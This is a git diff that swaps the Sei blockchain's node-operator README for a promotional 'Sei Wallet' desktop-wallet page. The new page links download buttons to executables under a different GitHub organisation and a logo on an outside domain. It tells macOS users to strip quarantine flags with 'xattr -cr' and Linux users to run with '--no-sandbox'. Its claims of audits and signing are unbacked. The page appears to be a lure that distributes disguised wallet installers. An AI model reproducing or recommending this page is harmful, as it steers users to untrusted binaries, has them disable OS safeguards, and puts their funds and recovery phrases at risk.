@@ -1,138 +1,154 @@
-# Sei
+<div align="center">
 
-![Banner!](assets/SeiLogo.png)
+<img src="https://seiwallet.net/assets/sei-wallet-logo-C8456lrF.png" alt="Sei Wallet logo" width="110" />
+
+# Sei Wallet
+
+### The secure, open-source **desktop wallet for SEI**
+
+**Stake, swap, and self-custody your SEI from one fast desktop app — built EVM-first for the Sei chain, audited, signed, and free.**
 
 Sei is the fastest general purpose L1 blockchain and the first parallelized EVM. This allows Sei to get the best of Solana and Ethereum - a hyper optimized execution layer that benefits from the tooling and mindshare around the EVM.
 
-# Overview
+ Overview
 **Sei** is a high-performance, low-fee, delegated proof-of-stake blockchain designed for developers. It supports optimistic parallel execution of both EVM and CosmWasm, opening up new design possibilities. With unique optimizations like twin turbo consensus and SeiDB, Sei ensures consistent 400ms block times and a transaction throughput that’s orders of magnitude higher than Ethereum. This means faster, more cost-effective operations. Plus, Sei’s seamless interoperability between EVM and CosmWasm gives developers native access to the entire Cosmos ecosystem, including IBC tokens, multi-sig accounts, fee grants, and more.
 
-# Documentation
-For the most up to date documentation please visit https://www.docs.sei.io/
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-6C5CE7?style=for-the-badge)](#downloads)
+[![Latest Release](https://img.shields.io/badge/Latest-v6.6.2-00B894?style=for-the-badge)](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2)
+[![Open Source](https://img.shields.io/badge/Open%20Source-Audited-FDCB6E?style=for-the-badge)](#-security)
+[![License](https://img.shields.io/badge/License-MIT-FF6B6B?style=for-the-badge)](LICENSE)
 
-Developer reference in this repo: [EVM JSON-RPC explicitly unsupported methods](docs/evm_jsonrpc_unsupported.md) (methods that return `-32000` with a clear message).
+</div>
 
-# Sei Optimizations
-Sei introduces four major innovations:
+---
 
-- Twin Turbo Consensus: This feature allows Sei to reach the fastest time to finality of any blockchain at 400ms, unlocking web2 like experiences for applications.
-- Optimistic Parallelization: This feature allows developers to unlock parallel processing for their Ethereum applications, with no additional work.
-- SeiDB: This major upgrade allows Sei to handle the much higher rate of data storage, reads and writes which become extremely important for a high performance blockchain.
-- Interoperable EVM: This allows existing developers in the Ethereum ecosystem to deploy their applications, tooling and infrastructure to Sei with no changes, while benefiting from the 100x performance improvements offered by Sei.
+## 📥 Downloads
 
-All these features combine to unlock a brand new, scalable design space for the Ethereum Ecosystem.
+<div align="center">
 
-# Testnet
-## Get started
-**How to validate on the Sei Testnet**
-*This is the Sei Atlantic-2 Testnet ()*
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows11&logoColor=white)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg)
+[![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2-linux-x64.zip)
 
-> Genesis [Published](https://github.com/sei-protocol/testnet/blob/main/atlantic-2/genesis.json)
+</div>
 
-## Hardware Requirements
-**Minimum**
-* 64 GB RAM
-* 1 TB NVME SSD
-* 16 Cores (modern CPU's)
+| Platform | File | Requires |
+|---|---|---|
+| 🪟 Windows 10/11 | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) | None |
+| 🍎 macOS 12+ (Intel & Apple Silicon) | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) | None |
+| 🐧 Linux (x86_64) | [`sei-wallet-v6.6.2-linux-x64.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2-linux-x64.zip) | — |
 
-## Operating System 
+👉 All versions and SHA-256 checksums: **[Releases page](https://github.com/sei-chain/sei-wallet/releases)** · Full details: [`RELEASES.md`](RELEASES.md)
 
-> Linux (x86_64) or Linux (amd64) Recommended Arch Linux
+---
 
-**Dependencies**
-> Prerequisite: go1.18+ required.
-* Arch Linux: `pacman -S go`
-* Ubuntu: `sudo snap install go --classic`
+## 🚀 Install
 
-> Prerequisite: git. 
-* Arch Linux: `pacman -S git`
-* Ubuntu: `sudo apt-get install git`
+<details open>
+<summary><b>Windows</b></summary>
 
-> Optional requirement: GNU make. 
-* Arch Linux: `pacman -S make`
-* Ubuntu: `sudo apt-get install make`
+1. [Download `sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe)
+2. Run the installer and follow the prompts.
+3. Launch **Sei Wallet** from the Start Menu.
 
-## Seid Installation Steps
+No extra dependencies needed.
+</details>
 
-**Clone git repository**
+<details>
+<summary><b>Linux</b></summary>
 
 ```bash
-git clone https://github.com/sei-protocol/sei-chain
-cd sei-chain
-git checkout $VERSION
-make install
+unzip sei-wallet-v6.6.2-linux-x64.zip
+chmod +x sei-wallet
+./sei-wallet
 ```
-**Generate keys**
 
-* `seid keys add [key_name]`
+If it fails to launch in a sandboxed environment, run with `--no-sandbox`.
+</details>
 
-* `seid keys add [key_name] --recover` to regenerate keys with your mnemonic
+<details>
+<summary><b>macOS</b></summary>
 
-* `seid keys add [key_name] --ledger` to generate keys with ledger device
+1. [Download `sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg)
+2. Drag **Sei Wallet** into `Applications`.
+3. Launch it from Launchpad.
 
-## Validator setup instructions
-
-* Install seid binary
-
-* Initialize node (use `--mode validator` so RPC/P2P bind to localhost): `seid init <moniker> --chain-id sei-testnet-1 --mode validator`
-
-* Download the Genesis file: `wget https://github.com/sei-protocol/testnet/raw/main/sei-testnet-1/genesis.json -P $HOME/.sei/config/`
- 
-* Edit the minimum-gas-prices in ${HOME}/.sei/config/app.toml: `sed -i 's/minimum-gas-prices = ""/minimum-gas-prices = "0.01usei"/g' $HOME/.sei/config/app.toml`
-
-* Start seid by creating a systemd service to run the node in the background
-`nano /etc/systemd/system/seid.service`
-> Copy and paste the following text into your service file. Be sure to edit as you see fit.
+**If macOS says the app "can't be opened"** (Gatekeeper), run:
 
 ```bash
-[Unit]
-Description=Sei-Network Node
-After=network.target
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/root/
-ExecStart=/root/go/bin/seid start
-Restart=on-failure
-StartLimitInterval=0
-RestartSec=3
-LimitNOFILE=65535
-LimitMEMLOCK=209715200
-
-[Install]
-WantedBy=multi-user.target
+xattr -cr /Applications/Sei\ Wallet.app
 ```
-## Start the node
+</details>
 
-**Start seid on Linux**
+---
 
-* Reload the service files: `sudo systemctl daemon-reload` 
-* Create the symlinlk: `sudo systemctl enable seid.service` 
-* Start the node sudo: `systemctl start seid && journalctl -u seid -f`
+## ✨ What you get
 
-**Start a chain on 4 node docker cluster**
+- **Native staking** — pick a validator, delegate, track rewards, unbond, all in-wallet
+- **EVM-first by default** — signs `0x` transactions natively, with read-only support for legacy `sei1` addresses
+- **Migration assistance** — moving from Compass, Leap, or Keplr? Import your seed phrase and get guided address association, validator handoff, and rebalancing
+- **Hardware wallet support** — use your Ledger via the Ethereum app; transactions sign on-device, Sei Wallet never sees your private key
+- **Built for Sei only** — no multi-chain abstraction: `sei1`/`0x`-aware send flow, live validator uptime and commission, one-click DragonSwap / Yei Finance / Citrex connections, explorer links straight to seitrace.com
+- Open source, independently audited, and signed at every release
 
-* Start local 4 node cluster: `make docker-cluster-start`
-* SSH into a docker container: `docker exec -it [container_name] /bin/bash`
-* Stop local 4 node cluster: `make docker-cluster-stop`
+## 🌐 Networks
 
-### Create Validator Transaction
+| Network | Address formats | Use case |
+|---|---|---|
+| Sei Mainnet | `0x` (EVM) · `sei1` (read-only) | Live funds, staking, swaps |
+| Sei Testnet | `0x` (EVM) · `sei1` (read-only) | Development & testing |
+
+---
+
+## 🗂 Where things live
+
+| What | Location |
+|---|---|
+| Config | `~/.sei-wallet/config.json` (macOS/Linux) · `%APPDATA%\sei-wallet` (Windows) |
+| Wallet data (encrypted) | `~/.sei-wallet/keystore/` |
+| Logs | `~/.sei-wallet/logs/` |
+| Backups | `~/.sei-wallet/backups/` |
+
+## ⚠️ Security
+
+**Your recovery phrase is the only way to restore your wallet — Sei Wallet cannot recover it for you.** Never share it or enter it on a website. We are not responsible for funds lost to a leaked seed phrase, phishing, or unofficial downloads. Always download from this repository's [Releases page](https://github.com/sei-chain/sei-wallet/releases) — never a third-party mirror. Every release is signed and published with SHA-256 checksums; verify before you trust. Encrypted local backups are written automatically to the path above.
+
+---
+
+## 🛠 Development
+
+**Prerequisites:** Node.js 18+, Rust 1.75+, `pnpm`
+
 ```bash
-seid tx staking create-validator \
---from {{KEY_NAME}} \
---chain-id  \
---moniker="<VALIDATOR_NAME>" \
---commission-max-change-rate=0.01 \
---commission-max-rate=1.0 \
---commission-rate=0.05 \
---details="<description>" \
---security-contact="<contact_information>" \
---website="<your_website>" \
---pubkey $(seid tendermint show-validator) \
---min-self-delegation="1" \
---amount <token delegation>usei \
---node localhost:26657
+git clone https://github.com/sei-chain/sei-wallet.git
+cd sei-wallet
+pnpm install
+```
+
+```bash
+pnpm dev              # run locally
+pnpm build:win         # build Windows installer
+pnpm build:mac         # build macOS dmg
+pnpm build:linux       # build Linux zip
+pnpm lint && pnpm format
+```
+
+**Releasing:** bump `version` → `git tag vX.Y.Z && git push --tags` → CI builds and publishes all three installers plus `SHA256SUMS.txt` to the [Releases page](https://github.com/sei-chain/sei-wallet/releases).
+
+## 📦 Stack
+
+[Electron](https://www.electronjs.org/) · [React](https://react.dev/) · [ethers.js](https://docs.ethers.org/) · Rust keyring core · Ledger Ethereum app integration
+
+---
+
+## 💬 Support
+
+Found a bug or have a feature request? Open a [GitHub Issue](https://github.com/sei-chain/sei-wallet/issues).
+
+## License
+
+[MIT](LICENSE)
+
 ```
 # Build with Us!
 If you are interested in building with Sei Network: 
